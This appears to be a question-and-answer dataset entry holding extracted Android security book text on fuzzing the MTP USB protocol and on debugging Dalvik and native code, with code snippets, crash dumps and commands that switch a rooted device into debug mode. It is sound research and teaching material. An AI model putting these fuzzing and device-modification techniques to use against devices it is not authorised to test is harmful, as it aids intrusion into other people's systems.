transactions, the OpCode fi eld is selected from the\nOpCodes dictionary defi ned previously. Likewise, Response transactions use\nthe ResCodes dictionary.\nAlthough these objects describe the packets used by the fuzzer, they do not\nimplement the input generation entirely on their own. Olle implements the\nremainder of input generation in the examples/mtp_fuzzer.py fi le. The source\ncode follows.\n31 trans = struct.unpack(\"I\", os.urandom(4))[0]\n32 r = struct.unpack(\"H\", os.urandom(2))[0]\n33 opcode = OpCodes.items()[r%len(OpCodes)][1]\n34 if opcode == OpCodes[\"CloseSession\"]:\n35 opcode = 0\n36 cmd = Container()/fuzz(Operation(OpCode=opcode,\nTransactionID=trans, SessionID=dev.current_session()))\nLines 31 through 33 select a random MTP Transaction type and Operation\ncode. Lines 34 and 35 handle the special case when the CloseSession Operation\nis randomly selected. If the session is closed, the fuzzer will be unlikely to\nexercise any of the underlying code that requires an open session. In MTP, this\nis nearly all operations. Finally, the Operation request packet is built on line\n36. Note that Olle uses the fuzz function from Scapy, which fi lls in the various\npacket fi elds with random values. At this point, the fuzzed input is generated\nand ready to be delivered to the target device.\nProcessing Inputs\nThe MTP specifi cation discusses the Initiator and Responder roles within the\nprotocol fl ow. As with most USB device communications, the host is the Initiator\nand the device is the Responder. As such, Olle coded his fuzzer to repeatedly\nsend Operation packets and read Response packets. To do this, he used PyUSB,\nwhich is a popular set of Python bindings to the libusb communications library.\nThe API provided by PyUSB is clean and easy to use.\nc06.indd 01:19:0:PM 02/24/2014 Page 201\n202 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\nOlle starts by creating an MTPDevice class in USBFuzz/MTP.py. He derives\nthis class from PyUSB’s BulkPipe class, which is used, as its name suggests, for\ncommunicating with USB Bulk Pipes. Apart from a couple of timing-related\noptions, this class needs the Vendor Id and the Product Id of the target device.\nAfter creating the initial connection to the device, much of the functionality\npertains to monitoring rather than delivering inputs. As such, it will be discussed\nfurther in the next section.\nBack in examples/mtp_fuzz.py, Olle implemented the rest of the input pro-\ncessing code. The following is the relevant code:\n16 s = dev.new_session()\n17 cmd = Container()/Operation(OpCode=OpCodes[\"OpenSession\"],\nParameter1=s)\n18 cmd.show2()\n19 dev.send(cmd)\n20 response = dev.read_response()\n[...]\n27 while True:\n[...]\n38 dev.send(cmd)\n39 response = dev.read_response(trans)\nOn lines 16 through 20, Olle opens a session with the MTP device. This process\nconsists of sending an Operation packet using the OpenSession operation code\nfollowed by reading a Response packet. As shown on lines 38 and 39, this really\nis all that is done to deliver inputs for processing. The typical USB master-slave\nrelationship between the host and the device makes processing inputs easy\ncompared to other types of fuzzing. With inputs getting processed, the only\nthing left is to monitor the system for ill behavior.\nMonitoring Testing\nFuzzing most USB devices provides relatively little means for monitoring what is\nhappening inside the device itself. Android devices are different in this regard.\nIt’s much easier to use typical monitoring mechanisms on Android. In fact, the\nmethods discussed earlier in this chapter work great. Still, as mentioned in the\nearlier “USB Fuzzing Challenges” section, the device might reset the USB bus\nor stop responding. These situations require special handling.\nOlle’s usb-device-fuzzing tool does not do any monitoring on the device\nitself. This fact isn’t surprising, as he was not targeting Android devices when\nhe developed his fuzzer. However, Olle does go to lengths to monitor the device\nitself from the host. The MTPDevice class implements a method called is_alive\nin order to keep tabs on whether the device is responsive. In this method, Olle\nfi rst checks to see if the device is alive using the underlying BulkPipe class.\nc06.indd 01:19:0:PM 02/24/2014 Page 202\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 203\nFollowing that, he sends a Skip Operation packet using an unknown transaction\nidentifi er (0xdeadbeef). This is almost sure to illicit some sort of error response\nsignifying that the device is ready to process more inputs.\nIn the main fuzzer code in examples/mtp_fuzzer.py, Olle starts by resetting\nthe device. This puts the device in what is presumed to be a known good state.\nThen, in the main loop, Olle calls the is_alive method after each interaction with\nthe device. If the device stops responding, he again resets the device to return\nit to working order. This is a good strategy for keeping the fuzzer running for\nlong periods of time. However, running this fuzzer against an Android device\nmade it apparent that it is insuffi cient. In addition to using is_alive, Olle also\nprints out the Operation and Response packets that are sent and received. This\nhelps determine what caused a particular issue, but it isn’t perfect. In particular,\nit’s diffi cult to replay inputs this way. Also, it’s diffi cult to tie an input directly\nto a crash.\nWhen targeting an Android device with this fuzzer, monitoring Android’s\nsystem log yields excellent feedback. However, it’s still necessary to deal with\nfrequent device resets. Thankfully, this is pretty simple using the following\ncommand.\ndev:~/android/usb-device-fuzzing $ while true; do adb wait-for-device \\\nlogcat; done\n[.. log output here ..]\nWith this command running, it’s possible to see debugging messages logged\nby the MtpServer code running in the device. Like when fuzzing Chrome for\nAndroid, monitoring the system log immediately reveals a bunch of error messages\nthat indicate certain parts of the protocol are not supported. Commenting these\nout will increase effi ciency and is unlikely to impact the potential to fi nd bugs.\nWhen we ran this fuzzer against a 2012 Nexus 7 with Android 4.4, a crash\nappeared within only a few minutes. The following message was logged when\nthe process hosting the MtpServer thread crashed:\nFatal signal 11 (SIGSEGV) at 0x66f9f002 (code=1), thread 413 (MtpServer)\n*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***\nBuild fingerprint: 'google/nakasi/grouper:4.4/KRT16O/907817:user/release-\nkeys'\nRevision: '0'\npid: 398, tid: 413, name: MtpServer >>> android.process.media <<<\nsignal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 66f9f002\nr0 5a3adb58 r1 66f92008 r2 66f9f000 r3 0000cff8\nr4 66fa2dd8 r5 000033fb r6 5a3adb58 r7 00009820\nr8 220b0ff6 r9 63ccbef0 sl 63ccc1c4 fp 63ccbef0\nip 63cc3a11 sp 6a8e3a8c lr 63cc3fc9 pc 63cc3d2a cpsr 000f0030\nLooking closer showed that this was a harmless crash, but the fact that a\ncrash happened so quickly indicates there may be other issues lurking within.\nc06.indd 01:19:0:PM 02/24/2014 Page 203\n204 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\nWe leave additional fuzzing against MtpServer, other USB protocols, devices,\nand so on to you if you’re interested. All in all, this section shows that even\napplying existing public fuzzers can fi nd bugs in Android.\nSummary\nThis chapter provided all of the information needed to get started fuzzing on\nAndroid. It explored the high-level process of fuzzing, including identifying\ntargets, creating test inputs, processing those inputs, and monitoring for ill\nbehavior. It explained the challenges and benefi ts of fuzzing on Android.\nNOTE Chapter 11 provides additional information about fuzzing SMS on Android\ndevices.\nThe chapter was rounded out with in-depth discussions of three fuzzers.\nTwo of these fuzzers were developed specifi cally for this chapter. The last\nfuzzer was a public fuzzer that was simply targeted at an Android device. In\neach case, the fuzzer led to the discovery of issues in the underlying code. This\nshows that fuzzing is an effective technique for discovering bugs and security\nvulnerabilities lurking inside Android devices.\nThe next chapter shows you how to gain a deeper understanding of bugs\nand vulnerabilities through debugging and vulnerability analysis. Applying\nthe concepts within allows you to harvest fuzz results for security bugs, paving\nthe way for turning them into working exploits.\nc06.indd 01:19:0:PM 02/24/2014 Page 204"
  },
  {
    "input": "What are the key steps and tools involved in debugging Android applications, including both Dalvik code and native code, and how can researchers access and analyze crash information and system logs to identify and understand vulnerabilities?",
    "summary": "",
    "output": "CHAPTER\n7\nDebugging and Analyzing\nVulnerabilities\nIt’s very diffi cult—arguably impossible—to create programs that are free of\nbugs. Whether the goal is to extinguish bugs or to exploit them, liberal applica-\ntion of debugging tools and techniques is the best path to understanding what\nwent wrong. Debuggers allow researchers to inspect running programs, check\nhypotheses, verify data fl ow, catch interesting program states, or even modify\nbehavior at runtime. In the information security industry, debuggers are essen-\ntial to analyzing vulnerability causes and judging just how severe issues are.\nThis chapter explores the various facilities and tools available for debugging\non the Android operating system. It provides guidance on how to set up an\nenvironment to achieve maximum effi ciency when debugging. Using some\nexample code and a real vulnerability, you walk through the debugging process\nand see how to analyze crashes to determine their root cause and exploitability.\nGetting All Available Information\nThe fi rst step to any successful debugging or vulnerability analysis session is\nto gather all available information. Examples of valuable information include\ndocumentation, source code, binaries, symbol fi les, and applicable tools. This\nsection explains why these pieces of information are important and how you\nuse them to achieve greater effi cacy when debugging.\n205\nc07.indd 11:8:41:AM 02/25/2014 Page 205\n206 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nLook for documentation about the specifi c target, protocols that the target\nuses, fi le formats the target supports, and so on. In general, the more you know\ngoing in, the better chance of a successful outcome. Also, having easily accessible\ndocumentation during analysis often helps overcome unexpected diffi culties\nquickly.\nCROSSREFERENCE Information about how and where to obtain source code\nfor various Android devices is covered in Appendix B.\nThe source code to the target can be invaluable during analysis. Reading\nsource code is usually much more effi cient than reverse-engineering assembly\ncode, which is often very tedious. Further, access to source code gives you the\nability to rebuild the target with symbols. As discussed in the “Debugging with\nSymbols” section later in this chapter, symbols makes it possible to debug at\nthe source-code level. If source code for the target itself is not available, look\nfor source code to competing products, derivative works, or ancient precursors.\nThough they probably will not match the assembly, sometimes you get lucky.\nDifferent programmers, even with wildly different styles, tend to approach\ncertain problems the same way. In the end, every little bit of information helps.\nBinaries are useful for two reasons. First, the binaries from some devices\ncontain partial symbols. Symbols provide valuable function information such\nas function names, as well as parameter names and types. Symbols bridge\nthe gap between source code and binary code. Second, even without symbols,\nbinaries provide a map to the program. Using static analysis tools to reverse\nengineer binaries yields a wealth of information. For example, disassemblers\nreconstruct the data and control fl ow from the binary. They facilitate navigating\nthe program based on control fl ow, which makes it easier to get oriented in the\ndebugger and fi nd interesting program locations.\nSymbols are more important on ARM-based systems than on x86 systems.\nAs discussed in Chapter 9, ARM processors have several execution modes. In\naddition to names and types, symbols are also used to encode the processor\nmode used to execute each function. Further, ARM processors often store read-\nonly constants used by a function immediately following the function’s code\nitself. Symbols are also used to indicate where this data lies. These special types\nof symbols are particularly important when debugging. Debuggers encounter\nissues when they don’t have access to symbols, especially when displaying stack\ntraces or inserting breakpoints. For example, the instruction used to install a\nbreakpoint differs between processor modes. If the wrong one is used, it could\nlead to a program crash, the breakpoint being missed, or even a debugger crash.\nc07.indd 11:8:41:AM 02/25/2014 Page 206\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 207\nFor these reasons, symbols are the most precious commodity when debugging\nARM binaries on Android.\nFinally, having the right tools for the job always makes the job easier.\nDisassemblers such as IDA Pro and radare2 provide a window into binary code.\nMost disassemblers are extensible using plug-ins or scripts. For example, IDA\nPro has a plug-in application programming interface (API) and two scripting\nengines (IDC and Python), and radare2 is embeddable and provides bindings\nfor several programming languages. Tools that extend these disassemblers may\nprove to be indispensable during analysis, especially when symbols are not\navailable. Depending on the particular target program, other tools may also\napply. Utilities that expose what’s happening at the network, fi le system, system\ncall, or library API level provide valuable perspectives on a program’s execution.\nChoosing a Toolchain\nA toolchain is a collection of tools that are used to develop a product. Usually,\na toolchain includes a compiler, linker, debugger, and any necessary system\nlibraries. Simply put, building a toolchain or choosing an existing one is the\nfi rst step to building your code. For the purpose of this chapter, the debugger\nis the most interesting component. As such, you need to choose a workable\ntoolchain accordingly.\nFor Android, the entity that builds a particular device selects the toolchain\nduring development. As a researcher trying to debug the compiler’s output, the\nchoice affects you directly. Each toolchain represents a snapshot of the tools it\ncontains. In some cases, different versions of the same toolchain are incompat-\nible. For example, using a debugger from version A on a binary produced by\na compiler from version B may not work, or it may even cause the debugger to\ncrash. Further, many toolchains have various bugs. To minimize compatibility\nissues, it is recommended that you use the same toolchain that the manufacturer\nused. Unfortunately, determining exactly which toolchain the manufacturer\nused can be diffi cult.\nIn the Android and ARM Linux ecosystems, there are a variety of debuggers\nfrom which to choose. This includes open source projects, as well as commercial\nproducts. Table 7-1 describes several of the tools that include an ARM Linux\ncapable debugger.\nc07.indd 11:8:41:AM 02/25/2014 Page 207\n208 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nTable 7-1: Tools that Include an ARM Linux Debugger\nTOOL DESCRIPTION\nIDA Pro IDA Pro is a commercial disassembler product that includes a remote\ndebugging server for Android.\nDebootstrap Maintained by the Debian Project, this tool allows running the GNU\nDebugger (GDB) on a device.\nLinaro Linaro provides toolchains for several versions of Android going back to\nGingerbread.\nRVDS ARM’s offi cial compiler toolchain is commercial but evaluation copies are\navailable.\nSourcery Formerly Sourcery G++, Mentor Graphics’s toolchain is available in evalua-\ntion, commercial, and Lite editions.\nAndroid The offi cial Android Native Development Kit (NDK) enables app developers\nNDK to include native code in their apps.\nAOSP The Android Open Source Project (AOSP) repository includes a prebuilt\nPrebuilt toolchain that is used to build AOSP fi rmware images.\nIn the course of writing this book, the authors experimented with a few of the\ntoolchains described in this section. Specifi cally, we tried out IDA’s android_\nserver, the Debootstrap GDB package, the Android NDK debugger, and the\nAOSP debugger. The latter two are documented in detail in the “Debugging\nNative Code” section later in this chapter. The best results were achieved when\nwe used the AOSP prebuilt toolchain in conjunction with an AOSP-supported\nNexus device. Individual mileage may vary.\nDebugging with Crash Dumps\nThe simplest debugging facility provided by Android is the system log. Accessing\nthe system log is accomplished by running the logcat utility on the device. It\nis also accessible using the logcat Android Debug Bridge (ADB) device com-\nmand. We introduced this facility in Chapter 2 and used it in Chapters 4 and 6\nto watch for various system events. Monitoring the system log puts a plethora\nof real-time feedback, including exceptions and crash dumps, front and center.\nWe highly recommend monitoring the system log whenever you do any testing\nor debugging on an Android device.\nSystem Logs\nWhen an exception occurs in a Dalvik application, including in the Android\nFramework, the exception detail is written to the system log. The following excerpt\nfrom the system log of a Motorola Droid 3 shows one such exception occurring.\nc07.indd 11:8:41:AM 02/25/2014 Page 208\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 209\nD/AndroidRuntime: Shutting down VM\nW/dalvikvm: threadid=1: thread exiting with uncaught exception\n(group=0x4001e560)\nE/AndroidRuntime: FATAL EXCEPTION: main\nE/AndroidRuntime: java.lang.RuntimeException: Error receiving broadcast\nIntent\n{ act=android.intent.action.MEDIA_MOUNTED dat=file:///sdcard/nosuchfile }\nin\ncom.motorola.usb.UsbService$1@40522c10\nE/AndroidRuntime: at android.app.LoadedApk$ReceiverDispatcher$Args.\nrun\n(LoadedApk.java:722)\nE/AndroidRuntime: at android.os.Handler.handleCallback(Handler.\njava:587)\nE/AndroidRuntime: at android.os.Handler.dispatchMessage(Handler.\njava:92)\nE/AndroidRuntime: at android.os.Looper.loop(Looper.java:130)\nE/AndroidRuntime: at\nandroid.app.ActivityThread.main(ActivityThread.java:3821)\nE/AndroidRuntime: at java.lang.reflect.Method.invokeNative(Native\nMethod)\nE/AndroidRuntime: at java.lang.reflect.Method.invoke(Method.\njava:507)\nE/AndroidRuntime: at\ncom.android.internal.os.ZygoteInit$MethodAndArgsCaller.run\n(ZygoteInit.java:839)\nE/AndroidRuntime: at\ncom.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)\nE/AndroidRuntime: at dalvik.system.NativeStart.main(Native Method)\nE/AndroidRuntime: Caused by: java.lang.ArrayIndexOutOfBoundsException\nE/AndroidRuntime: at java.util.ArrayList.get(ArrayList.java:313)\nE/AndroidRuntime: at com.motorola.usb.UsbService.onMediaMounted\n(UsbService.java:624)\nE/AndroidRuntime: at\ncom.motorola.usb.UsbService.access$1100(UsbService.java:54)\nE/AndroidRuntime: at\ncom.motorola.usb.UsbService$1.onReceive(UsbService.java:384)\nE/AndroidRuntime: at android.app.LoadedApk$ReceiverDispatcher$Args.\nrun\n(LoadedApk.java:709)\nE/AndroidRuntime: ... 9 more\nIn this case, a RuntimeException was raised when receiving a MEDIA_MOUNTED\nIntent. The Intent is being processed by the com.motorola.usb.UsbService\nBroadcast Receiver. Walking further up the exception stack reveals that an\nArrayIndexOutOfBoundsException occurred in the onMediaMounted function\nin the UsbService. Presumably, the exception occurs because the file:///\nsdcard/nosuchfile uniform resource indicator (URI) path does not exist. As\nseen on the third line, the exception is fatal and causes the service to terminate.\nTombstones\nWhen a crash occurs in native code on Android, the debugger daemon prepares\na brief crash report and writes it to the system log. In addition, debuggerd also\nsaves the crash report to a fi le called a tombstone. These fi les are located in the\nc07.indd 11:8:41:AM 02/25/2014 Page 209\n210 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\n/data/tombstones directory on nearly all Android devices. Because access to\nthis directory and the fi les inside it is usually restricted, reading tombstone\nfi les typically requires root access. The following excerpt shows an abbreviated\nexample of a native code crash log:\n255|shell@mako:/ $ ps | lolz\n/system/bin/sh: lolz: not found\nFatal signal 13 (SIGPIPE) at 0x00001303 (code=0), thread 4867 (ps)\n*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***\nBuild fingerprint: 'google/occam/mako:4.3/JWR66Y/776638:user/relea...\nRevision: '11'\npid: 4867, tid: 4867, name: ps >>> ps <<<\nsignal 13 (SIGPIPE), code -6 (SI_TKILL), fault addr --------\nr0 ffffffe0 r1 b8efe0b8 r2 00001000 r3 00000888\nr4 b6fa9170 r5 b8efe0b8 r6 00001000 r7 00000004\nr8 bedfd718 r9 00000000 sl 00000000 fp bedfda77\nip bedfd76c sp bedfd640 lr b6f80dd5 pc b6f7c060 cpsr 200b0010\nd0 75632f7274746120 d1 0000000000000020\nd2 0000000000000020 d3 0000000000000020\nd4 0000000000000000 d5 0000000000000000\nd6 0000000000000000 d7 8af4a6c000000000\nd8 0000000000000000 d9 0000000000000000\nd10 0000000000000000 d11 0000000000000000\nd12 0000000000000000 d13 0000000000000000\nd14 0000000000000000 d15 0000000000000000\nd16 c1dd406de27353f8 d17 3f50624dd2f1a9fc\nd18 41c2cfd7db000000 d19 0000000000000000\nd20 0000000000000000 d21 0000000000000000\nd22 0000000000000000 d23 0000000000000000\nd24 0000000000000000 d25 0000000000000000\nd26 0000000000000000 d27 0000000000000000\nd28 0000000000000000 d29 0000000000000000\nd30 0000000000000000 d31 0000000000000000\nscr 00000010\nbacktrace:\n#00 pc 0001b060 /system/lib/libc.so (write+12)\n#01 pc 0001fdd3 /system/lib/libc.so (__sflush+54)\n#02 pc 0001fe61 /system/lib/libc.so (fflush+60)\n#03 pc 00020cad /system/lib/libc.so\n#04 pc 00022291 /system/lib/libc.so\n...\nThe crash in the preceding example is triggered by the SIGPIPE signal. When\nthe system attempts to pipe the output from the ps command to the lolz com-\nmand, it fi nds that lolz does not exist. The operating system then delivers the\nSIGPIPE signal to the ps process to tell it to terminate its processing. In addition\nto the SIGPIPE signal, several other signals are caught and result in a native\ncrash log. Most notably, segmentation violations are logged via this facility.\nExclusively using crash dumps for debugging leaves much to be desired.\nResearchers turn to interactive debugging when crash dumps are not enough.\nc07.indd 11:8:41:AM 02/25/2014 Page 210\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 211\nThe rest of this chapter focuses on interactive debugging methods and how to\napply them to analyze vulnerabilities.\nRemote Debugging\nRemote debugging is a form of debugging in which a developer uses a debug-\nger that runs on a separate computer from the target program. This method\nis commonly used when the target program uses full screen graphics or, as in\nour case, the target device doesn’t provide a suitable interface for debugging. To\nachieve remote debugging, a communication channel must be set up between\nthe two machines. Figure 7-1 depicts a typical remote debugging confi guration,\nas it applies to Android devices.\nUSB or Wi-Fi Connection\nFigure 7-1: Remote debugging configuration\nIn this confi guration, the developer connects his device to his host machine\neither via the same local area network (LAN) or universal serial bus (USB).\nWhen using a LAN, the device connects to the network using Wi-Fi. When\nusing USB, the device is plugged directly into the host machine. The developer\nthen runs a debugger server and a debugger client on the Android device and\nhis host machine, respectively. The client then communicates with the server\nto debug the target program.\nRemote debugging is the preferred method for debugging on Android. This\nmethodology is used when debugging both Dalvik code and native code. Because\nmost Android devices have a relatively small screen and lack a physical keyboard,\nc07.indd 11:8:41:AM 02/25/2014 Page 211\n212 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nthey don’t have debugger-friendly interfaces. As such, it’s easy to see why remote\ndebugging is preferred.\nDebugging Dalvik Code\nThe Java programming language makes up a large part of the Android software\necosystem. Many Android apps, as well as much of the Android Framework,\nare written in Java and then compiled down to Dalvik bytecode. As with any\nsignifi cantly complex software stack, programmers make mistakes and bugs\nare born. Tracking down, understanding, and addressing these bugs is a job\nmade far easier with the use of a debugger. Thankfully, many usable tools exist\nfor debugging Dalvik code.\nDalvik, like its Java cousin, implements a standardized debug interface called\nJava Debug Wire Protocol, or JDWP for short. Nearly all of the various tools\nthat exist for debugging Dalvik and Java programs are built upon this proto-\ncol. Although the internals of the protocol are beyond the scope of this book,\nstudying this protocol may be benefi cial to some readers. A good starting point\nfor obtaining more information is Oracle’s documentation on JDWP at http://\ndocs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html.\nAt the time of this writing, two offi cial development environments are pro-\nvided by the Android team. The newer of the two, Android Studio, is based on\nIntelliJ IDEA made by JetBrains. Unfortunately, this tool is still in the prerelease\nphase. The other tool, the Android Development Tools (ADT) plug-in for the\nEclipse IDE, is and has been the offi cially supported development environ-\nment for Android app developers since the r3 release of the Android Software\nDevelopment Kit (SDK).\nIn addition to development environments, several other tools are built upon\nthe JDWP standard protocol. For instance, the Android Device Monitor and\nDalvik Debug Monitor Server (DDMS) tools included with the Android SDK use\nJDWP. These tools facilitate app profi ling and other system-monitoring tasks.\nThey use JDWP to access app-specifi c information like threads, heap usage, and\nongoing method calls. Beyond the tools included with the SDK, several other\ntools also rely on JDWP. Among these are the traditional Java Debugger (JDB)\nprogram included with Oracle’s Java Development Kit (JDK) and the AndBug\ntool demonstrated in Chapter 4. This is by no means an exhaustive list, as JDWP\nis used by several other tools not listed in this text.\nIn an effort to simplify matters, we chose to stick to the offi cially supported\ntools for the demonstrations in this section. Throughout the examples in this\nsection, we used the following software:\n■ Ubuntu 12.04 on amd64\n■ Eclipse from eclipse-java-indigo-SR2-linux-gtk-x86_64.tar.gz\nc07.indd 11:8:41:AM 02/25/2014 Page 212\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 213\n■ Android SDK r22.0.5\n■ Android NDK r9\n■ Android’s ADT plug-in v22.0.5\nTo make developers’ lives easier, the Android team started offering a combined\ndownload called the ADT Bundle in late 2012. It includes Eclipse, the ADT plug-\nin, the Android SDK and Platform-tools, and more. Rather than downloading\neach component separately, this single download contains everything most\ndevelopers need. The only noteworthy exception is the Android NDK, which\nis only needed for building apps that contain native code.\nDebugging an Example App\nUsing Eclipse to debug an Android app is easy and straightforward. The Android\nSDK comes with a number of sample apps that help you become familiar with\nthe Eclipse environment. However, a dead simple “Hello World” app is included\nin the materials for this chapter on the book’s website: www.wiley.com/go/\nandroidhackershandbook. We use this app for demonstrative purposes throughout\nthis section. To follow along, import the HelloWorld project into your Eclipse\nworkspace using File ➢ Import followed by General ➢ Existing Projects into\nWorkspace. After Eclipse fi nishes loading, it displays the Java perspective as\nshown in Figure 7-2.\nFigure 7-2: Eclipse Java perspective\nc07.indd 11:8:41:AM 02/25/2014 Page 213\n214 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nTo begin debugging the application, click the Debug As icon in the toolbar—\nthe one that looks like a bug—to bring up the Debug perspective. As its name\nimplies, this perspective is designed especially for debugging. It displays the\nviews most pertinent to debugging, which puts the focus on the most relevant\ninformation. Figure 7-3 shows the debug perspective after the debugging ses-\nsion has launched.\nFigure 7-3: Eclipse Debug perspective\nAs you can see, several of the views displayed are not present in the Java\nperspective. In fact, the only views common with the Java perspective are the\noutline and source code views. In Figure 7-3, the debugger is stopped on a\nbreakpoint placed in the main activity. This is apparent from the highlighted\nline of code and the stack frame selected in the Debug view. Clicking the vari-\nous stack frames in this view displays the surrounding code in the source code\nview. Clicking frames for which no source code is available displays a descrip-\ntive error instead. The next section describes how to display source code from\nthe Android Framework while debugging.\nAlthough this method is straightforward, a lot of things are happening\nunder the hood. Eclipse automatically handles building a debug version of\nthe app, installing the app to the device, launching the app, and attaching the\ndebugger. Debugging applications on an Android device typically requires the\nandroid:debuggable=true fl ag to be set in the application’s manifest, also known\nc07.indd 11:8:41:AM 02/25/2014 Page 214\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 215\nas the AndroidManifest.xml fi le. Later, in the “Debugging Existing Code” sec-\ntion, methods for debugging other types of code are presented.\nShowing Framework Source Code\nOccasionally, it’s useful to see how the application code is interacting with the\nAndroid Framework. For example, you may be interested in how the application\nis being invoked or how calls into the Android Framework are being processed.\nThankfully it’s possible to display the source code for the Android Framework\nwhen clicking stack frames, just as the source code for an app is displayed.\nThe fi rst thing you need to accomplish this is a properly initialized AOSP\nrepository. To initialize AOSP properly, follow the build instructions from the\noffi cial Android documentation located at http://source.android.com/source/\nbuilding.html. When using a Nexus device, as we recommend, pay special\nattention to the branch and confi guration for the device being used. You can\nfi nd these details at http://source.android.com/source/building-devices\n.html. The fi nal step for initialization is running the lunch command. After the\nAOSP repository is initialized correctly, proceed to the next step.\nThe next step involves building a class path for Eclipse. From the AOSP root\ndirectory, run the make idegen command to build the idegen.sh script. When\nthe build is complete, you can fi nd the script in the development/tools/idegen\ndirectory. Before running the script, create the excluded-paths fi le in the top-\nlevel directory. Exclude all of the directories under the top-level that you don’t\nwant to include. To make this step easier, an example excluded-paths fi le, which\nincludes only code from the frameworks directory, is included in the materials\naccompanying this book. When the excluded-paths fi le is ready, execute the\nidegen.sh script. The following shell session excerpt shows the output from a\nsuccessful execution:\ndev:~/android/source $ ./development/tools/idegen/idegen.sh\nRead excludes: 3ms\nTraversed tree: 1794ms\ndev:~/android/source $ ls -l .classpath\n-rw------- 1 jdrake jdrake 20K Aug 25 17:46 .classpath\ndev:~/android/source $\nThe resulting class path data gets written to the .classpath fi le in the current\ndirectory. You will use this in the next step.\nThe next step involves creating a new project to contain the source code\nfi les from the class path that you generated. Using the same workspace as the\n“Hello World” app from the previous section, create a new Java project with\nFile ➢ New Project ➢ Java ➢ Java Project. Enter a name for the project, such as\nAOSP Framework Source. Deselect the Use Default Location check box and\ninstead specify the path to the top-level AOSP directory. Here, Eclipse uses the\n.classpath fi le created in the previous step. Click Finish to conclude this step.\nc07.indd 11:8:41:AM 02/25/2014 Page 215\n216 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nNOTE Due to the sheer size of the Android code, Eclipse may run out of memory\nwhen creating or loading this project. To work around this issue, add the -vmargs\n-Xmx1024m command line options when starting Eclipse.\nNext, start debugging the example application as in the last section. If the\nbreakpoint is still set in the main activity’s onCreate function, execution pauses\nthere. Now, click one of the parent stack frames in the debug view. It should\nbring up a Source Not Found error message. Click the Attach Source button.\nRevealing the button may require enlarging the window because the window\ndoes not scroll. When the Source Attachment Confi guration dialog appears,\nclick the Workspace button. Select the AOSP Framework Source project that\nwas created in the previous step and click OK. Click OK again. Finally, click the\nstack frame in the debug view again. Voilà! The source code for the Android\nFramework function related to selected stack frame should be displayed. Figure\n7-4 shows Eclipse displaying the source code for the function that calls the main\nactivity’s onCreate function.\nFigure 7-4: Source for Activity.performCreate in Eclipse\nAfter following the instructions in this section, you can use Eclipse to step\nthrough Android Framework source code. However, some code was inten-\ntionally excluded from the class path. Should displaying code from excluded\nclasses become necessary, modify the included excluded-paths fi le. Likewise,\nif you determine that some included paths aren’t necessary for your debugging\nc07.indd 11:8:41:AM 02/25/2014 Page 216\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 217\nsession, add them to excluded-paths. After modifying excluded-paths, repeat\nthe process to regenerate the .classpath fi le.\nDebugging Existing Code\nDebugging system services and prebuilt apps requires a slightly different\napproach. As briefl y mentioned, debugging Dalvik code typically requires that\nit be contained within an app that has the android:debuggable fl ag set to true.\nAs shown in Figure 7-5, fi ring up DDMS or Android Device Monitor, which\ncome with the Android SDK, only shows debuggable processes.\nFigure 7-5: Android Device Monitor with ro.debuggable=0\nAs shown, only the com.example.helloworld application appears. This is\ntypical for a stock device.\nAn engineering device, which is created by building with the eng build confi gu-\nration, allows accessing all processes. The primary difference between eng and\nuser or userdebug builds lies in the values for the ro.secure and ro.debuggable\nsystem properties. Both user and userdebug builds set these values to 1 and\n0, respectively; whereas an eng build sets them to 0 and 1. Additionally, eng\nbuilds run the ADB daemon with root privileges. In this section, methods for\nmodifying these settings on a rooted device and actually attaching to existing\nprocesses are covered.\nc07.indd 11:8:41:AM 02/25/2014 Page 217\n218 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nFaking a Debug Device\nLuckily, modifying a rooted device to enable debugging other code is not ter-\nribly involved. There are two avenues to accomplish this; each with its own\nadvantages and disadvantages. The fi rst method involves modifying the boot\nprocesses of the device. The second method is readily executed on a rooted\ndevice. In either case, special steps are required.\nThe fi rst method, which isn’t covered in depth in this chapter, involves chang-\ning the ro.secure and ro.debuggable settings in the device’s default.prop fi le.\nHowever, this special fi le is usually stored in the initrd image. Because this\nis a ram disk, modifying it requires extracting and repacking the boot.img for\nthe device. Although this method can semipermanently enable system-wide\ndebugging, it also requires the target device to have an unlocked boot loader. If\nthis method is preferable, you can fi nd more detail on building a custom boot\n.img in Chapter 10.\nThe second method involves following only a few simple steps as the root\nuser. Using this method avoids the need to unlock the boot loader, but is less\npermanent. The effects of following these steps persist only until the device is\nrebooted. First, obtain a copy of the setpropex utility, which enables modify-\ning read-only system properties on a rooted device. Use this tool to change the\nro.secure setting to 0 and the ro.debuggable setting to 1.\nshell@maguro:/data/local/tmp $ su\nroot@maguro:/data/local/tmp # ./setpropex ro.secure 0\nroot@maguro:/data/local/tmp # ./setpropex ro.debuggable 1\nroot@maguro:/data/local/tmp # getprop ro.secure\n0\nroot@maguro:/data/local/tmp # getprop ro.debuggable\n1\nNext, restart the ADB daemon with root privileges by disconnecting and\nusing the adb root command from the host machine.\nroot@maguro:/data/local/tmp # exit\nshell@maguro:/data/local/tmp $ exit\ndev:~/android $ adb root\nrestarting adbd as root\ndev:~/android $ adb shell\nroot@maguro:/ #\nNOTE Some devices, including Nexus devices running Android 4.3, ship with a\nversion of the adbd binary that does not honor the adb root command. For those\ndevices, remount the root partition read/write, move /sbin/adbd aside, and copy\nover a custom-built userdebug version of adbd.\nc07.indd 11:8:41:AM 02/25/2014 Page 218\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 219\nThe fi nal step is to restart all processes that depend on the Dalvik 